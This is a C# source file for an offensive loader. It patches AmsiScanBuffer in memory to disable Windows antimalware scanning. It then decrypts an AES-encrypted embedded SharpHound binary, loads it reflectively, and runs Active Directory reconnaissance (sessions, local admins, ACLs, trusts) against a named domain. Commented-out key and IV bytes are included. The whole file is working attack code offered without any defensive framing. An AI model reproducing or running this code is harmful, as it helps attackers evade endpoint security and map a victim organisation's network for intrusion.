using System.IO;
using System.Reflection;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace TestBypass
{
    class Program
    {
        static Program ()
        {
            Main(new string[] { "" });
        }

        [STAThread]
        static void Main(string[] args)
        {
            Amsi.Bypass();

            byte[] unpacked = null;
            unpacked = Misc.Decrypt(Properties.Resources.SHound);
            
            Assembly a = Assembly.Load(unpacked); //.LoadFile(@"E:\Documents\GitHub\SharpHound3\SharpHound3\bin\Release\SharpHound.exe");

            //Assembly a = Assembly.LoadFile(@"E:\Documents\GitHub\SharpHound3\SharpHound3\bin\Release\Confused\SharpHound.exe");

            

            string fileName = "PC.txt";
            FileInfo fi = new FileInfo(fileName);
            
            // Check if file already exists. If yes, delete it.     
            if (fi.Exists)
            {
                fi.Delete();
            }
            
            // Create a new file     
            using (TextWriter fs = fi.CreateText())
            {
                fs.WriteLine(Properties.Resources.PC);
            }
            
            a.EntryPoint.Invoke(null, new object[] { new string[] { "SharpHound.exe --PrettyJson -ComputerFile .\\PC.txt --CollectionMethod \"Group LocalAdmin RDP DCOM GPOLocalGroup Session LoggedOn Trusts ACL\" -Domain avp.ru" } });

        }
    }

    public class Amsi
    {
        // https://twitter.com/_xpn_/status/1170852932650262530
        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        public static void Bypass()
        {
            if (is64Bit())
                PatchAmsi(x64);
            else
                PatchAmsi(x86);
        }

        private static void PatchAmsi(byte[] patch)
        {
            try
            {
                var lib = Win32.LoadLibrary("amsi.dll");
                var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
    }

    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }

    class Misc
    {
        private static byte[] PerformCryptography(ICryptoTransform cryptoTransform, byte[] data)
        {
            using (var memoryStream = new MemoryStream())
            {
                using (var cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    return memoryStream.ToArray();
                }
            }
        }

        static readonly byte[] myIV = Properties.Resources.IV;
        //new byte[] { 40, 58, 32, 174, 187, 91, 201, 68, 81, 201, 230, 98, 222, 237, 26, 145 };
        static readonly byte[] myKey = Properties.Resources.key;
        //new byte[] { 141, 46, 84, 223, 171, 106, 191, 231, 223, 254, 202, 22, 25, 216, 114, 211, 134, 201, 239, 179, 80, 64, 238, 106, 174, 7, 173, 31, 14, 142, 140, 179 };


        public static byte[] Encrypt(byte[] data)
        {
            Aes _algorithm = Aes.Create();

            using (var encryptor = _algorithm.CreateEncryptor(myKey, myIV))
            {
                return PerformCryptography(encryptor, data);
            }

        }

        public static byte[] Decrypt(byte[] data)
        {
            Aes _algorithm = Aes.Create();
            using (var decryptor = _algorithm.CreateDecryptor(myKey, myIV))
            {
                return PerformCryptography(decryptor, data);
            }

        }

    }
}
